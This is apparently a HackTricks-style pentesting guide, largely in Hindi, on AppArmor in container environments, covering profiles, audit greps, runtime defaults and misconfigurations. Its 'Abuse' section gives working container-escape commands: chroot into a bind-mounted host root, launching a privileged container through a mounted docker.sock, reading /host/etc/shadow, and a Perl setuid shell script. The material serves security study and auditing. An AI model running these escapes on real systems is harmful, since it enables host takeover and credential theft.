# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## अवलोकन

AppArmor एक **Mandatory Access Control** सिस्टम है जो प्रति-प्रोग्राम प्रोफाइल्स के माध्यम से प्रतिबंध लागू करता है। परंपरागत DAC चेक्स के विपरीत, जो user और group ownership पर बहुत निर्भर होते हैं, AppArmor kernel को उस process से जुड़ी policy लागू करने देता है। container environments में यह महत्वपूर्ण होता है क्योंकि किसी workload के पास पारंपरिक privileges किसी क्रिया को करने के लिए पर्याप्त हो सकते हैं, फिर भी उसे इसलिए रोका जा सकता है कि उसका AppArmor profile संबंधित path, mount, network व्यवहार, या capability उपयोग की अनुमति नहीं देता।

सबसे महत्वपूर्ण संकल्पनात्मक बिंदु यह है कि AppArmor **path-based** है। यह filesystem access को labels के बजाय path rules के माध्यम से तय करता है, जैसा कि SELinux करता है। यह इसे सुलभ और शक्तिशाली बनाता है, लेकिन इसका यह भी मतलब है कि bind mounts और वैकल्पिक path layouts को सावधानी से देखा जाना चाहिए। यदि वही host सामग्री किसी दूसरे path के तहत पहुँच में आ जाती है, तो policy का प्रभाव वह नहीं हो सकता जो operator ने पहली बार उम्मीद की थी।

## कंटेनर आइसोलेशन में भूमिका

Container security reviews अक्सर capabilities और seccomp पर ही रुक जाते हैं, लेकिन उन चेक्स के बाद भी AppArmor मायने रखता है। कल्पना कीजिए एक ऐसा container जिसके पास जितना अधिकार होना चाहिए उससे ज्यादा privilege है, या कोई workload जिसे operational कारणों से एक अतिरिक्त capability की ज़रूरत थी। AppArmor अभी भी file access, mount व्यवहार, networking, और execution पैटर्न्स को सीमित कर सकता है ताकि स्पष्ट दुरुपयोग पथ रोका जा सके। यही कारण है कि AppArmor को "बस application चलाने के लिए" disable करना चुपचाप एक केवल जोखिमभरे कॉन्फ़िगरेशन को सक्रिय रूप से exploitable में बदल सकता है।

## लैब

यह जांचने के लिए कि AppArmor होस्ट पर सक्रिय है या नहीं, उपयोग करें:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
यह देखने के लिए कि वर्तमान container process किसके तहत चल रहा है:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
यह अंतर शिक्षाप्रद है। सामान्य मामले में, प्रक्रिया को AppArmor context दिखना चाहिए जो runtime द्वारा चुने गए profile से जुड़ा होता है। unconfined मामले में वह अतिरिक्त restriction layer गायब हो जाता है।

आप यह भी जांच सकते हैं कि Docker ने क्या लागू किया समझा है:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker होस्ट पर AppArmor सपोर्ट होने पर डिफॉल्ट या कस्टम AppArmor profile लागू कर सकता है। Podman भी AppArmor-आधारित सिस्टम पर AppArmor के साथ एकीकृत हो सकता है, हालांकि SELinux-first distributions में अक्सर दूसरा MAC सिस्टम प्रमुख रहता है। Kubernetes उन नोड्स पर workload-स्तर पर AppArmor policy एक्सपोज़ कर सकता है जो वास्तव में AppArmor सपोर्ट करते हैं। LXC और संबंधित Ubuntu-family system-container वातावरण भी व्यापक रूप से AppArmor का उपयोग करते हैं।

व्यावहारिक बात यह है कि AppArmor कोई "Docker feature" नहीं है। यह एक host-kernel feature है जिसे कई runtimes लागू करने का विकल्प चुन सकते हैं। यदि होस्ट इसे सपोर्ट नहीं करता या runtime को unconfined चलाने के लिए कहा गया है, तो कथित सुरक्षा वास्तव में मौजूद नहीं होती।

Kubernetes के लिए विशेष रूप से, आधुनिक API `securityContext.appArmorProfile` है। Since Kubernetes `v1.30`, पुराने beta AppArmor annotations deprecated हैं। सपोर्टेड होस्ट्स पर, `RuntimeDefault` डिफॉल्ट profile है, जबकि `Localhost` उस profile की ओर इशारा करता है जो node पर पहले से लोड होना चाहिए। यह review के दौरान मायने रखता है क्योंकि एक manifest AppArmor-aware दिख सकता है जबकि वह पूरी तरह से node-side सपोर्ट और प्री-लोडेड profiles पर निर्भर हो सकता है।

एक सूक्ष्म लेकिन उपयोगी संचालनात्मक विवरण यह है कि स्पष्ट रूप से `appArmorProfile.type: RuntimeDefault` सेट करना केवल field को छोड़ने से अधिक कड़ा है। यदि field स्पष्ट रूप से सेट है और नोड AppArmor सपोर्ट नहीं करता, तो admission fail होना चाहिए। यदि field छोड़ा गया है, तो workload अभी भी बिना AppArmor वाले नोड पर चल सकता है और बस उस अतिरिक्त confinement layer को प्राप्त नहीं करेगा। एक attacker के दृष्टिकोण से, यह manifest और वास्तविक node state दोनों की जांच करने का एक अच्छा कारण है।

Docker-capable AppArmor होस्ट्स पर, सबसे प्रसिद्ध डिफॉल्ट `docker-default` है। वह profile Moby's AppArmor template से जनरेट होता है और इसलिए महत्वपूर्ण है क्योंकि यह समझाता है कि कुछ capability-based PoCs अभी भी default container में क्यों fail होते हैं। सामान्य तौर पर, `docker-default` सामान्य networking को अनुमति देता है, `/proc` के बड़े हिस्सों में writes को deny करता है, `/sys` के संवेदनशील हिस्सों तक access deny करता है, mount operations को ब्लॉक करता है, और ptrace को इस तरह से restricted करता है कि यह सामान्य host-probing primitive न रहे। उस baseline को समझना इस बात में मदद करता है कि "the container has `CAP_SYS_ADMIN`" और "the container can actually use that capability against the kernel interfaces I care about" में अंतर कैसे है।

## Profile Management

AppArmor profiles आम तौर पर `/etc/apparmor.d/` के तहत स्टोर होते हैं। एक सामान्य नामकरण कन्वेंशन executable path में slashes को dots से बदलना है। उदाहरण के लिए, `/usr/bin/man` के लिए एक profile आमतौर पर `/etc/apparmor.d/usr.bin.man` के रूप में स्टोर किया जाता है। यह विवरण defense और assessment दोनों के दौरान मायने रखता है क्योंकि एक बार जब आप active profile नाम जान लेते हैं, तो आप अक्सर संबंधित फ़ाइल को होस्ट पर जल्दी से ढूँढ सकते हैं।

Useful host-side management commands include:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
ये कमांड्स container-security संदर्भ में इसलिए महत्वपूर्ण हैं क्योंकि ये बताती हैं कि प्रोफ़ाइल असल में कैसे बनाए जाते हैं, लोड किए जाते हैं, complain mode में स्विच किए जाते हैं, और application में बदलावों के बाद कैसे संशोधित किए जाते हैं। अगर कोई ऑपरेटर troubleshooting के दौरान प्रोफ़ाइल्स को complain mode में ले जाने की आदत रखता है और enforcement को पुनर्स्थापित करना भूल जाता है, तो container दस्तावेज़ों में सुरक्षित दिख सकता है जबकि वास्तविकता में इसका व्यवहार कहीं ज्यादा ढीला हो सकता है।

### प्रोफ़ाइल बनाना और अपडेट करना

`aa-genprof` एप्लिकेशन के व्यवहार का निरीक्षण कर सकता है और इंटरएक्टिव रूप से एक प्रोफ़ाइल जनरेट करने में मदद कर सकता है:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` एक टेम्पलेट प्रोफ़ाइल उत्पन्न कर सकता है जिसे बाद में `apparmor_parser` के साथ लोड किया जा सकता है:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
जब बाइनरी बदलता है और नीति को अपडेट करने की आवश्यकता होती है, तो `aa-logprof` लॉग में पाए गए denials को फिर से चलाकर ऑपरेटर को यह तय करने में मदद कर सकता है कि उन्हें allow करना है या deny करना है:
```bash
sudo aa-logprof
```
### लॉग्स

AppArmor अस्वीकृतियाँ अक्सर `auditd`, syslog, या `aa-notify` जैसे टूल्स के माध्यम से दिखाई देती हैं:
```bash
sudo aa-notify -s 1 -v
```
यह ऑपरेशनल और ऑफेंसिव दोनों तरह से उपयोगी है। Defenders इसका उपयोग profiles को refine करने के लिए करते हैं। Attackers इसका उपयोग यह जानने के लिए करते हैं कि कौन सा exact path या operation deny किया जा रहा है और क्या AppArmor exploit chain को block कर रहा है।

### सही profile फ़ाइल की पहचान

जब कोई runtime किसी container के लिए एक specific AppArmor profile name दिखाता है, तो उस नाम को disk पर मौजूद profile file से मैप करना अक्सर उपयोगी होता है:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
यह होस्ट-साइड समीक्षा के दौरान विशेष रूप से उपयोगी है क्योंकि यह उस अंतर को पाटता है जो "the container says it is running under profile `lowpriv`" और "the actual rules live in this specific file that can be audited or reloaded" के बीच है।

### ऑडिट करने के लिए हाई-सिग्नल नियम

जब आप किसी profile को पढ़ सकते हैं, तो केवल साधारण `deny` लाइनों पर रुकें नहीं। कुछ नियम प्रकार सामग्रीगत रूप से बदल देते हैं कि AppArmor container escape प्रयास के विरुद्ध कितना उपयोगी होगा:

- `ux` / `Ux`: execute the target binary unconfined. यदि कोई पहुंचने योग्य helper, shell, या interpreter `ux` के अंतर्गत अनुमति प्राप्त है, तो यह आम तौर पर पहले टेस्ट करने वाली चीज़ होती है।
- `px` / `Px` and `cx` / `Cx`: perform profile transitions on exec. ये अपने आप में गलत नहीं हैं, लेकिन इन्हें ऑडिट करना चाहिए क्योंकि एक transition वर्तमान profile से कहीं अधिक व्यापक profile पर उतर सकता है।
- `change_profile`: allows a task to switch into another loaded profile, immediately or at next exec. यदि destination profile कमजोर है, तो यह एक restrictive domain से बाहर निकलने का intended escape hatch बन सकता है।
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: ये यह बदल देते हैं कि आप profile पर कितना भरोसा करते हैं। `complain` denials को लॉग करता है enforcing के बजाय, `unconfined` boundary को हटा देता है, और `prompt` पूरी तरह kernel-enforced deny की बजाय userspace decision path पर निर्भर करता है।
- `userns` or `userns create,`: newer AppArmor policy user namespaces के निर्माण का मध्यस्थता कर सकती है। अगर कोई container profile इसे स्पष्ट रूप से अनुमति देता है, तो nested user namespaces तब भी प्रभाव में रहते हैं जब platform AppArmor को उसकी hardening strategy के हिस्से के रूप में उपयोग करता है।

उपयोगी होस्ट-साइड grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
This kind of audit is often more useful than staring at hundreds of ordinary file rules. If a breakout depends on executing a helper, entering a new namespace, or escaping into a less restrictive profile, the answer is often hidden in these transition-oriented rules rather than in the obvious `deny /etc/shadow r` style lines.

## Misconfigurations

The most obvious mistake is `apparmor=unconfined`. Administrators often set it while debugging an application that failed because the profile correctly blocked something dangerous or unexpected. If the flag remains in production, the entire MAC layer has effectively been removed.

Another subtle problem is assuming that bind mounts are harmless because the file permissions look normal. Since AppArmor is path-based, exposing host paths under alternate mount locations can interact badly with path rules. A third mistake is forgetting that a profile name in a config file means very little if the host kernel is not actually enforcing AppArmor.

## Abuse

When AppArmor is gone, operations that were previously constrained may suddenly work: reading sensitive paths through bind mounts, accessing parts of procfs or sysfs that should have remained harder to use, performing mount-related actions if capabilities/seccomp also permit them, or using paths that a profile would normally deny. AppArmor is often the mechanism that explains why a capability-based breakout attempt "should work" on paper but still fails in practice. Remove AppArmor, and the same attempt may start succeeding.

If you suspect AppArmor is the main thing stopping a path-traversal, bind-mount, or mount-based abuse chain, the first step is usually to compare what becomes accessible with and without a profile. For example, if a host path is mounted inside the container, start by checking whether you can traverse and read it:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
यदि container के पास `CAP_SYS_ADMIN` जैसी खतरनाक capability भी है, तो सबसे व्यावहारिक परीक्षणों में से एक यह है कि क्या AppArmor mount operations या संवेदनशील kernel फाइलसिस्टम्स तक पहुँच को रोकने वाला नियंत्रण है:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
ऐसे वातावरणों में जहाँ host path पहले से ही bind mount के माध्यम से उपलब्ध है, AppArmor खो जाने पर एक read-only information-disclosure issue सीधे host file access में बदल सकता है:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
इन कमांड्स का मकसद यह नहीं है कि AppArmor अकेले ही breakout बनाता है। असल बात यह है कि एक बार AppArmor हटा देने पर कई filesystem और mount-based abuse paths तुरंत परीक्षण योग्य हो जाते हैं।

### पूर्ण उदाहरण: AppArmor अक्षम + होस्ट रूट माउंटेड

यदि container में पहले से ही host root `/host` पर bind-mounted है, तो AppArmor हटाने से एक blocked filesystem abuse path पूरी तरह से host escape में बदल सकता है:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
एक बार जब shell host filesystem के माध्यम से चलने लगे, तो workload प्रभावी रूप से container boundary को पार कर चुका है:
```bash
id
hostname
cat /etc/shadow | head
```
### पूर्ण उदाहरण: AppArmor Disabled + Runtime Socket

यदि वास्तविक बाधा AppArmor द्वारा runtime state के चारों ओर थी, तो एक mounted socket पूर्ण escape के लिए पर्याप्त हो सकता है:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
### पूर्ण उदाहरण: Path-Based Bind-Mount Bypass

सटीक पथ mount point पर निर्भर करता है, पर अंतिम परिणाम वही होता है: AppArmor अब runtime API तक पहुँच को रोक नहीं रहा है, और runtime API एक host-compromising container लॉन्च कर सकता है।

क्योंकि AppArmor path-based है, `/proc/**` की सुरक्षा करना स्वचालित रूप से उसी host procfs सामग्री की रक्षा नहीं करता जब वह किसी अलग पथ के माध्यम से पहुँच योग्य हो:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
The impact depends on what exactly is mounted and whether the alternate path also bypasses other controls, but this pattern is one of the clearest reasons AppArmor must be evaluated together with mount layout rather than in isolation.

### पूरा उदाहरण: Shebang Bypass

AppArmor policy कभी-कभी एक interpreter path को इस तरह लक्षित करती है कि वह shebang handling के माध्यम से script execution को पूरी तरह ध्यान में नहीं रखती। एक ऐतिहासिक उदाहरण में एक ऐसा script इस्तेमाल किया गया था जिसकी पहली लाइन एक confined interpreter की तरफ इशारा करती थी:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
इस प्रकार का उदाहरण यह याद दिलाने के लिए महत्वपूर्ण है कि profile के इरादे और वास्तविक निष्पादन व्यवहार अलग हो सकते हैं। जब AppArmor को container environments में समीक्षा किया जा रहा हो, तो interpreter chains और alternate execution paths को विशेष ध्यान दिया जाना चाहिए।

## जांच

इन जांचों का उद्देश्य तीन प्रश्नों का जल्दी से उत्तर देना है: क्या AppArmor host पर enabled है, क्या current process confined है, और क्या runtime ने वास्तव में इस container पर कोई profile apply किया है?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.
- If `/sys/kernel/security/apparmor/profiles` does not contain the profile you expected, the runtime or orchestrator configuration is not enough by itself.
- If a supposedly hardened profile contains `ux`, broad `change_profile`, `userns`, or `flags=(complain)` style rules, the practical boundary may be much weaker than the profile name suggests.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## रनटाइम डिफॉल्ट्स

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor-सक्षम होस्ट पर डिफ़ॉल्ट रूप से सक्रिय | यदि ओवरराइड न किया गया हो तो `docker-default` AppArmor profile का उपयोग करता है | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | होस्ट-निर्भर | AppArmor `--security-opt` के माध्यम से समर्थित है, लेकिन सटीक डिफ़ॉल्ट होस्ट/रनटाइम पर निर्भर करता है और Docker के दस्तावेजीकृत `docker-default` profile जितना सार्वभौमिक नहीं होता | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | सशर्त डिफ़ॉल्ट | यदि `appArmorProfile.type` निर्दिष्ट नहीं है तो डिफ़ॉल्ट `RuntimeDefault` है, लेकिन यह केवल तब लागू होता है जब node पर AppArmor सक्षम हो | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` (कमज़ोर profile के साथ), AppArmor समर्थन न करने वाले नोड |
| containerd / CRI-O under Kubernetes | नोड/रनटाइम समर्थन का पालन करता है | सामान्य Kubernetes-सपोर्टेड runtimes AppArmor का समर्थन करते हैं, पर वास्तविक प्रवर्तन अभी भी नोड समर्थन और workload सेटिंग्स पर निर्भर रहता है | Kubernetes पंक्ति के समान; डायरेक्ट runtime कॉन्फ़िगरेशन भी AppArmor को पूरी तरह छोड़ सकता है |

AppArmor के लिए सबसे महत्वपूर्ण चर अक्सर केवल runtime नहीं बल्कि **host** होता है। किसी manifest में profile सेटिंग उस नोड पर confinement नहीं बनाती जहाँ AppArmor सक्षम नहीं है।

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
